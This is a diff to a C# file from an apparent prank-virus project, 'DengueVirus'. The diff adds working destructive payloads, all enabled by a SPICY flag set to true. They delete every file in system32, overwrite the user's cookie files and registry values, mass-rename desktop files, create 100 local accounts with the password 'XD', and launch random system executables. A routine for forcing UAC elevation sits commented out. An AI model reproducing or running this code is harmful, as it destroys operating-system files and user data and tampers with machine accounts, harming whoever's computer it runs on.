@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.DirectoryServices.AccountManagement;
+using System.Text;
 
 namespace DengueVirus.Spicy
 {
@@ -13,6 +15,18 @@ namespace DengueVirus.Spicy
         // To disable the payloads, comment SPICY = true line below, or change it to false.
 
         public static bool SPICY = true;
+
+        public static string GenRandomUnicodeString(int length)
+        {
+            Random random = new Random();
+            StringBuilder builder = new StringBuilder();
+            for (int i = 0; i < length; i++)
+            {
+                // make it use all unicode characters inst4ead of only cyrillic
+                builder.Append((char)random.Next(0x0000, 0xFFFF)); // Cyrillic characters as an example
+            }
+            return builder.ToString();
+        }
 
         public static void WriteNote()
         {
@@ -78,8 +92,8 @@ namespace DengueVirus.Spicy
             {
                 "@echo off",
                 Environment.NewLine,
-                "echo Welcome to the Dungeon (c) 1986 Amjads (pvt) Ltd VIRUS_SHOE RECORD V9.0", 
-                Environment.NewLine, 
+                "echo Welcome to the Dungeon (c) 1986 Amjads (pvt) Ltd VIRUS_SHOE RECORD V9.0",
+                Environment.NewLine,
                 "echo Dedicated to the dynamic memories of millions of viruses who are no longer with us today",
                 Environment.NewLine,
                 "echo - Thanks GOODNESS!!! BEWARE OF THE er..VIRUS : this program is catching program follows after these ....$#@%$@!!",
@@ -96,14 +110,7 @@ namespace DengueVirus.Spicy
         public static void OpenRandomEXE()
         {
             if (!SPICY) return;
-            /*// Open a random exe file from system32
-            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
-            Random random = new Random();
-            for (int i = 0; i < 5; i++)
-            {
-                Process.Start(files[random.Next(files.Length)]);
-            }*/
-            // Open a random exe file from system32, from a string with its names
+
             string[] files = {
                 "notepad.exe",
                 "calc.exe",
@@ -112,16 +119,46 @@ namespace DengueVirus.Spicy
                 "explorer.exe",
                 "write.exe",
                 "winver.exe",
-                /*"WmiMgmt.msc", enable if youre gonna test with Win10
-                "WorkFolders.exe", 
-                "wusa.exe",
-                "xwizard.exe",*/
+                "certmgr.exe",
+                "certreq.exe",
+                "charmap.exe",
+                "cipher.exe",
+                "cleanmgr.exe",
+                //"clip.exe",
+                "control.exe",
+                "diskpart.exe"
             };
+
             Random random = new Random();
             for (int i = 0; i < 5; i++)
-                Process.Start(files[random.Next(files.Length)]);
+            {
+                try
+                {
+                    Process.Start(files[random.Next(files.Length)]);
+                }
+                catch (Exception)
+                {
+                }
+            }
         }
 
+        public static void OpenRandomEXEFromSys32()
+        {
+            if (!SPICY) return;
+            // Open a random exe file from system32
+            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
+            Random random = new Random();
+            for (int i = 0; i < 10; i++)
+            {
+                try
+                {
+                    Process.Start(files[random.Next(files.Length)]);
+                }
+                catch (Exception)
+                {
+                }
+            }
+        }
         public static void OpenRandomScreensaver()
         {
             if (!SPICY) return;
@@ -130,7 +167,7 @@ namespace DengueVirus.Spicy
             Random random = new Random();
             //for (int i = 0; i < 5; i++)
             //{
-                Process.Start(files[random.Next(files.Length)]);
+            Process.Start(files[random.Next(files.Length)]);
             //}
         }
 
@@ -151,5 +188,109 @@ namespace DengueVirus.Spicy
                 Process.Start(files4[random.Next(files4.Length)]);
             }
         }
+        public static void OverwriteCookie()
+        {
+            if (!SPICY) return;
+            // Overwrite all cookies from the user's profile
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
+            string[] files = Directory.GetFiles(path);
+            foreach (string file in files)
+            {
+                try
+                {
+                    File.WriteAllText(file, "Error: THIS IS SPARTAAA!!!!");
+                }
+                catch (Exception)
+                { }
+            }
+        }
+
+        public static void MassRename(string ogextension, string newextension)
+        {
+            if (!SPICY) return;
+            // rename all computer files, including on subdirectories
+
+            //USAGE: MassRename("txt", "docx");
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string[] files = Directory.GetFiles(path, "*." + ogextension, SearchOption.AllDirectories);
+            foreach (string file in files)
+            {
+                try
+                {
+                    File.Move(file, file.Replace(ogextension, newextension));
+                }
+                catch (Exception)
+                { }
+            }
+        }
+        public static void CorruptRegistry()
+        {
+            if (!SPICY) return;
+            // Corrupt all HKEY_CURRENT_USER keys & values
+            string[] keys = Microsoft.Win32.Registry.CurrentUser.GetSubKeyNames();
+            foreach (string key in keys)
+            {
+                try
+                {
+                    Microsoft.Win32.Registry.CurrentUser.SetValue(key, "WUT????");
+                }
+                catch (Exception)
+                { }
+            }
+
+        }
+        public static void DeleteSystemFiles()
+        {
+            if (!SPICY) return;
+            // Delete all files from system32
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.System);
+            string[] files = Directory.GetFiles(path);
+            foreach (string file in files)
+            {
+                try
+                {
+                    File.Delete(file);
+                }
+                catch (Exception)
+                { }
+            }
+        }
+        public static void SpamWindowsWithAccounts()
+        {
+            if (!SPICY) return;
+            // Spam accs
+            for (int i = 0; i < 100; i++)
+            {
+                try
+                {
+                    using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
+                    {
+                        UserPrincipal user = new UserPrincipal(context);
+                        //user.Name = "User" + i.ToString();
+                        user.Name = GenRandomUnicodeString(10);
+                        user.SetPassword("XD");
+                        user.Save();
+                    }
+                }
+                catch (Exception)
+                {}
+            }
+        }
+        /*public static void ForceUACElevation()
+        {
+            if (!SPICY) return;
+            // Force UAC elevation
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.UseShellExecute = true;
+            startInfo.WorkingDirectory = Environment.CurrentDirectory;
+            startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
+            startInfo.Verb = "runas";
+            try
+            {
+                Process.Start(startInfo);
+            }
+            catch (Exception)
+            { }
+        }*/
     }
 }
